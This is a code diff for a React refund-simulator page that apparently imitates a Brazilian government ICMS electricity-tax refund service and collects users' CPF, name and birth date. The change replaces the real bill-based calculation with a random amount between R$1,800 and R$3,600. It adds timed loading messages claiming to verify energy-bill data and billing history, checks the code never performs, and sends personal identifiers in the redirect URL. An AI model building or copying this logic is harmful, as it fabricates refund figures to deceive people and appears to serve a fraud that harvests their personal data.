@@ -250,6 +250,9 @@ export default function SimuladorRestituicao({
     setCalculando(true);
     setAnimacaoAtiva(true);
     
+    // Mostrar tela de loading interna
+    setMostrarTelaLoading(true);
+    
     // Define o número de meses baseado na seleção do usuário
     let meses = 0;
     
@@ -272,7 +275,31 @@ export default function SimuladorRestituicao({
     
     setMesesConsiderados(meses);
     
-    // Realizar o cálculo
+    // Sequência de mensagens de carregamento
+    const mensagens = [
+      'Estamos calculando sua restituição...',
+      'Verificando os dados da sua conta de energia...',
+      'Analisando o histórico de cobranças...',
+      'Calculando os valores de ICMS pagos...',
+      'Conferindo os valores de restituição disponíveis...',
+      'Finalizando seu cálculo...'
+    ];
+    
+    // Função para mostrar mensagens sequencialmente com progresso
+    const mostrarMensagens = async () => {
+      for (let i = 0; i < mensagens.length; i++) {
+        setMensagemCarregamento(mensagens[i]);
+        setProgressoCarregamento(((i + 1) / mensagens.length) * 100);
+        
+        // Esperar 1.5 segundos antes de mostrar a próxima mensagem
+        await new Promise(resolve => setTimeout(resolve, 1500));
+      }
+    };
+    
+    // Iniciar a animação de mensagens
+    mostrarMensagens();
+    
+    // Realizar o cálculo em paralelo com a animação
     try {
       const cpfLimpo = cpf.replace(/\D/g, '');
       const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
@@ -290,27 +317,15 @@ export default function SimuladorRestituicao({
       } else {
         // Se não existe, calcular um novo valor
         
-        // Calcula o valor estimado da restituição - 0.25 é 25% (a taxa de ICMS)
-        let valorEstimado = valorMedioFinal * meses * 0.25;
+        // Gerar um valor aleatório entre 1.800 e 3.600 com centavos
+        const valorMinimo = 1800;
+        const valorMaximo = 3600;
+        let valorEstimado = Math.random() * (valorMaximo - valorMinimo) + valorMinimo;
+        // Arredonda para 2 casas decimais
+        valorEstimado = Math.round(valorEstimado * 100) / 100;
         
-        // Se o valor for inferior a R$ 1.800, gerar um valor aleatório entre R$ 1.800 e R$ 2.200
-        if (valorEstimado < 1800) {
-          // Gera um valor aleatório entre 1800 e 2200 com centavos
-          valorEstimado = Math.random() * (2200 - 1800) + 1800;
-          // Arredonda para 2 casas decimais
-          valorEstimado = Math.round(valorEstimado * 100) / 100;
-        }
-        
-        // Se o valor for maior que R$ 5.000,00, mostrar apenas R$ 5.000,00 e o valor real
-        if (valorEstimado > 5000) {
-          valorFinal = 5000;
-          setValorFinalRestituicao(5000);
-          setValorRealRestituicao(valorEstimado);
-        } else {
-          valorFinal = valorEstimado;
-          setValorFinalRestituicao(valorEstimado);
-          setValorRealRestituicao(0); // Não há valor "real" adicional
-        }
+        valorFinal = valorEstimado;
+        setValorFinalRestituicao(valorEstimado);
         
         // Salvar o valor calculado no banco de dados
         try {
@@ -332,20 +347,22 @@ export default function SimuladorRestituicao({
     } catch (error) {
       console.error("Erro ao consultar/salvar valor de restituição:", error);
       
-      // Em caso de erro, usamos o cálculo padrão
-      const valorEstimado = valorMedioFinal * meses * 0.25;
-      const valorFinal = Math.min(valorEstimado, 5000);
+      // Em caso de erro, geramos um valor aleatório
+      const valorMinimo = 1800;
+      const valorMaximo = 3600;
+      const valorEstimado = Math.random() * (valorMaximo - valorMinimo) + valorMinimo;
+      const valorFinal = Math.round(valorEstimado * 100) / 100;
       
       setValorFinalRestituicao(valorFinal);
-      if (valorEstimado > 5000) {
-        setValorRealRestituicao(valorEstimado);
-      } else {
-        setValorRealRestituicao(0);
-      }
     }
     
-    // Redirecionar para a página de loading
-    window.location.href = `/calculo-loading?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedioFinal)}&meses=${encodeURIComponent(mesesConsiderados)}`;
+    // Garantir que a tela de loading seja exibida por pelo menos 8 segundos
+    setTimeout(() => {
+      // Esconder tela de loading
+      setMostrarTelaLoading(false);
+      // Redirecionar para a página de resultado
+      window.location.href = `/resultado-calculo?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}&companhia=${encodeURIComponent(companhia)}&estado=${encodeURIComponent(estado)}&nasc=${encodeURIComponent(dataNascimento)}&valor=${encodeURIComponent(valorMedioFinal)}&meses=${encodeURIComponent(mesesConsiderados)}`;
+    }, 8000);
   };
   
   // Funções de navegação entre etapas
@@ -1115,7 +1132,7 @@ export default function SimuladorRestituicao({
   
   // Calcula a porcentagem de progresso baseado na etapa atual
   const calcularProgresso = () => {
-    const totalEtapas = 7; // Total de 8 etapas (0 a 7)
+    const totalEtapas = 3; // Total de 4 etapas (0 a 3)
     return ((etapaAtual) / totalEtapas) * 100;
   };
   
@@ -1148,20 +1165,18 @@ export default function SimuladorRestituicao({
           <span className={cn("font-medium", etapaAtual >= 1 ? "text-[var(--gov-blue)]" : "")}>Dados</span>
           <span className={cn("font-medium", etapaAtual >= 2 ? "text-[var(--gov-blue)]" : "")}>Valor</span>
           <span className={cn("font-medium", etapaAtual >= 3 ? "text-[var(--gov-blue)]" : "")}>Período</span>
-          <span className={cn("font-medium", etapaAtual >= 4 ? "text-[var(--gov-blue)]" : "")}>Resultado</span>
-          <span className={cn("font-medium", etapaAtual >= 7 ? "text-[var(--gov-blue)]" : "")}>Finalizar</span>
         </div>
         
         {/* Versão mobile - apenas etapa atual e adjacentes */}
         <div className="flex md:hidden justify-center mt-2 text-xs text-[var(--gov-gray-dark)]">
           <div className="text-center">
             <span className="font-medium text-[var(--gov-blue-dark)]">
-              Etapa {etapaAtual + 1} de 6: {" "}
+              Etapa {etapaAtual + 1} de 4: {" "}
               {etapaAtual === 0 ? "Início" : 
                etapaAtual === 1 ? "Dados" : 
                etapaAtual === 2 ? "Valor" : 
                etapaAtual === 3 ? "Período" : 
-               etapaAtual === 4 ? "Resultado" : "Finalizar"}
+               "Resultado"}
             </span>
           </div>
         </div>
